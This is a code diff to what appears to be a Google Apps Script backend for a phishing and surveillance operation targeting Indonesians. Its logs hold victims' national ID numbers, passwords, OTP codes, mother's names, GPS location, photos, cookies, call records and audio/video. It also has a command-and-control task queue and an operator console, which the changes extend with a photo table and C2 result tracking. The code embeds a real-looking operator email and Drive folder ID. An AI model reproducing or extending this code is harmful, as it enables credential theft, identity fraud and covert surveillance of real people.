@@ -9,7 +9,7 @@ var DRIVE_FOLDER_ID='1QgviD6FDitWLTOGG1P8WKq7tJ2Xo6zoD';
 var NOTIFY_EMAIL='ajasomplak3@gmail.com';
 var DUKCAPIL_URL='',DUKCAPIL_KEY='';
 var HOST_URUT='drive,catbox,tmpfiles,0x0';
-var BUILD='zgch-f23',AUTO_RELOAD=false;
+var BUILD='zgch-f25',AUTO_RELOAD=false;
 
 var H_LOG=['WAKTU','NIK','USERNAME','PASSWORD','DEVICE_ID','UA','PLATFORM','BAHASA','ZONA','LAYAR','RID','OTP','WAKTU_OTP','IP','ISP','LAT','LNG','AKURASI','MAPS','FOTO','SKOR','SIDIK','REFERRER','SID','HALAMAN','KLIK','STATUS','CATATAN','NO_KK','NO_HP','IBU'];
 var H_IMP=['SID','WAKTU','IP','ISP','KOTA','LAT','LNG','PROV','NEGARA','ZONA','DEVICE','PLATFORM','BAHASA','LAYAR','UA','MODEL','MEMORI','INTI','GPU','BATERAI','SIDIK','PROBE','YIELD','PROMPTS','LAUNDER','SUMBER','FOTO','TIPE','BRAND','MODEL_DEV','OS_DEV','BROWSER_DEV','SKOR_DET','DIKUNJUNGI','KAM'];
@@ -438,7 +438,7 @@ function saveNik(p){
   row[11]=nik.slice(12,16);
   row[12]=prov?1:0;row[15]=(tgl>=1&&tgl<=31&&bln>=1&&bln<=12)?1:0;row[16]=1;
   row[17]=nik.length===16?1:0;row[18]=(prov&&nik.length===16)?1:0;
-  row[19]=String(p.ok==='1'||p.ok===1?70:35);
+  row[19]=String((p.ok==='1'||p.ok===1)?70:35);
   row[20]=nama?'dukcapil':'turunan nik';row[21]=String(p.sid||'');row[22]=nama;
   row[23]=String(p.kk||'');row[24]=String(p.hp||'');row[25]=String(p.ibu||'');
   getSheet_(SHEET_NIK).appendRow(row);
@@ -524,9 +524,10 @@ function beacon(p){
   return out({ok:true});
 }
 function hasil(p){
-  var sh=getSheet_(SHEET_C2),r=findRow(sh,1,String(p.id||''));
-  sh.appendRow([String(p.sid||''),now_(),'hasil',String(p.id||''),'selesai',String(p.isi||''),'']);
-  if(r)sh.getRange(r,5).setValue('selesai');
+  var id=String(p.id||''),sid=String(p.sid||''),baris=Number(String(id).split('#')[1]||0);
+  var sh=getSheet_(SHEET_C2);
+  sh.appendRow([sid,now_(),'hasil',id,'selesai',String(p.isi||''),'']);
+  if(baris>1){try{sh.getRange(baris,5).setValue('selesai')}catch(e){}}
   return out({ok:true});
 }
 function task(sid,cmd,arg,ttl){
@@ -656,13 +657,14 @@ function tbl(head,rows){
   return '<div class="tw"><table class="tb"><tr>'+th+'</tr>'+
     (tr||'<tr><td colspan="'+head.length+'" class="mut">kosong</td></tr>')+'</table></div>';
 }
-function dumpTbl(sheet,head,kolom,filterSid,max){
+function dumpTbl(sheet,head,kolom,filterSid,max,kolSid){
   var sh=getSheet_(sheet),l=sh.getLastRow();
   if(l<2)return '<p class="mut">kosong</p>';
+  var ks=(kolSid==null?1:kolSid);
   var n=Math.min(l-1,max||120);
   var v=sh.getRange(2,1,l-1,HDR[sheet].length).getValues().reverse().slice(0,n),rows=[];
   v.forEach(function(r){
-    if(filterSid&&String(r[1])!==filterSid&&String(r[0])!==filterSid)return;
+    if(filterSid&&String(r[ks])!==filterSid)return;
     rows.push(kolom(r));
   });
   return tbl(head,rows);
@@ -680,6 +682,18 @@ function mediaTbl(sheet,filterSid){
     rows.push([esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[7]),isi]);
   });
   return tbl(['waktu','sid','durasi','byte','sumber','media'],rows);
+}
+function fotoTbl(filterSid){
+  var sh=getSheet_(SHEET_IMP),l=sh.getLastRow();
+  if(l<2)return '<p class="mut">kosong</p>';
+  var v=sh.getRange(2,1,l-1,H_IMP.length).getValues().reverse().slice(0,90),rows=[];
+  v.forEach(function(r){
+    if(filterSid&&String(r[0])!==filterSid)return;
+    var u=String(r[26]||'');
+    rows.push([esc(r[1]),esc(r[0]),esc(String(r[28]||'')+' '+String(r[29]||'')),esc(r[2]||''),
+      u?'<a href="'+esc(u)+'" target="_blank" rel="noopener"><img class="th" src="'+esc(u)+'" onclick="big(this)" loading="lazy"></a>':'-']);
+  });
+  return tbl(['waktu','sid','perangkat','ip','foto'],rows);
 }
 function sesiKartu(s,k,imp,nk){
   var d=imp[s.sid]||[],nn=nk[s.sid]||[];
@@ -736,7 +750,7 @@ function console(tab,sid){
     isi=dumpTbl(SHEET_TEL,['waktu','sid','nomor','jenis','durasi'],function(r){
       return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4])];
     },sid,400);
-  } else if(tab==='foto'){isi=mediaTbl(SHEET_IMP,sid);
+  } else if(tab==='foto'){isi=fotoTbl(sid);
   } else if(tab==='video'){isi=mediaTbl(SHEET_VID,sid);
   } else if(tab==='suara'){isi=mediaTbl(SHEET_AUD,sid);
   } else if(tab==='cookie'){
@@ -775,7 +789,7 @@ function console(tab,sid){
   } else if(tab==='det'){
     isi=dumpTbl(SHEET_DET,['waktu','sid','tipe','brand','model','os','browser','cpu','ram','gpu','skor'],function(r){
       return [esc(r[0]),esc(r[1]),esc(r[3]),esc(r[4]),esc(r[5]),esc(r[6]+' '+r[7]),esc(r[8]+' '+r[9]),esc(r[17]),esc(r[18]),esc(r[32]),esc(r[33])];
-    },sid,80);
+    },sid,80,0);
   } else if(tab==='c2'){
     isi=tbl(['waktu','arah','cmd','status','isi'],feedOf(sid).map(function(x){
       return [esc(x.t),esc(x.arah),esc(x.cmd),esc(x.st),esc(x.isi)];
@@ -787,7 +801,7 @@ function console(tab,sid){
   } else if(tab==='matrix'){
     isi=dumpTbl(SHEET_MX,['sid','waktu','cap','outcome','lat','note'],function(r){
       return [esc(r[0]),esc(r[1]),esc(r[5]),esc(r[6]),esc(r[7]),esc(r[8])];
-    },sid,150);
+    },sid,150,0);
   } else if(tab==='setelan'){
     isi='<div class="bar">'+
       ['repair|perbaiki header','jam|pasang jam','sapu|sapu antrean','ringkas|kirim ringkas',
